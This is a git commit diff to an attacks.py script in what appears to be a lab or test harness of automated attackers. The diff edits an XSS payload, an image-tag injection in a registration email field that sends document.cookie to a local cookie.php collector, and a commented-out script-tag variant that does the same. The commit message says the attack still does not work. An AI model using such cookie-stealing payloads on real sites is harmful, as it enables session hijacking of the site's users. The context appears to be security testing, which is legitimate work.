c68fec644bbc57242074f998275752707dc5dcd9
tk <tim_k@posteo.de>
2020-07-28 17:23:40 +0200

    small change xss attack...still not working

--- Automated_Users/Attacks/attacks.py
+++ Automated_Users/Attacks/attacks.py
@@ -176,7 +176,9 @@ class XSSAttack(Attack):
 
         url = self.base_url + "/api/Users"
 
-        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\"+ 100 >\", \"password\": \"xss\"}"
+        random_number = random.randint(0,99999)
+        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\" + document.cookie;>\", \"password\": \"" + str(random_number )+ "\"}"
+        #payload = "{\"email\": \"<script>new Image().src=\\\"http://127.0.0.1:8081/cookie.php?c=abc\\\";</script>\", \"password\": \"xss\"}"
 
         headers = {
             'Content-Type': 'application/json'
